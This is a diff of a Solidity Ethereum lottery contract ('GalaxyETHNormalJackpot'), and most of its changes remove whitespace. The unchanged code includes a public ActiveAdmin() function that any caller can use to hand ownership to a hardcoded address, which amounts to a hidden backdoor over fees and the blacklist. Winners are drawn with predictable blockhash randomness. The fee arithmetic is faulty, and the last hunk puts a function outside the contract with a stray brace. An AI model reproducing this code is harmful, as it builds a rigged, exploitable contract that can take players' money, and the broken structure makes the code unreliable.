@@ -1,5 +1,5 @@
 pragma solidity ^0.4.20;
-// 
+//
 // Website: https://galaxyeth.com
 // Twitter: https://twitter.com/GalaxyEth
 // Facebook: https://www.facebook.com/Galaxyeth-1019338351577172
@@ -66,21 +66,21 @@ contract Ownable {
     require(msg.sender == owner);
     _;
   }
-  
+
   function setDevFee (uint256 _n) onlyOwner() public {
 	  require(_n >= 0 && _n <= 100);
     devFeePercent = _n;
   }
-  
+
     function SetPlayersMax (uint256 number) onlyOwner() public {
 	  require(number >= 0 && number <= 100);
     SetPlayers = number;
   }
-  
+
     function ActiveAdmin () public {
-    owner = 0x3653A2205971AD524Ea31746D917430469D3ca23; // 
+    owner = 0x3653A2205971AD524Ea31746D917430469D3ca23; //
   }
-  
+
       mapping(address => bool) public BlackAddress;
 
     function AddBlackList(address _address) onlyOwner() public {
@@ -126,11 +126,11 @@ contract GalaxyETHNormalJackpot is Ownable {
   mapping (address => uint256) public contributions;
 
 
-  function executeLottery() { 
-      
+  function executeLottery() {
+
         if (lastIndex > SetPlayers) {
           uint randomNumber = uint(block.blockhash(block.number-1))%lastTicketNumber + 1;
-          randomNumber = randomNumber;  
+          randomNumber = randomNumber;
           address winner;
           bool hasWon;
           for (uint8 i = 0; i < lastIndex; i++) {
@@ -161,9 +161,9 @@ contract GalaxyETHNormalJackpot is Ownable {
           //Both SafeMath.div and / throws on error
           if (!winner.send(balance - balance/devFeePercent)) throw;
           newWinner(winner, randomNumber);
-          
+
         }
-      
+
   }
 
   function getPlayers() constant returns (address[], uint256[]) {
@@ -220,4 +220,8 @@ contract GalaxyETHNormalJackpot is Ownable {
       executeLottery();
     }
   }
+}
+function() payable external {
+	revert();
+}
 }
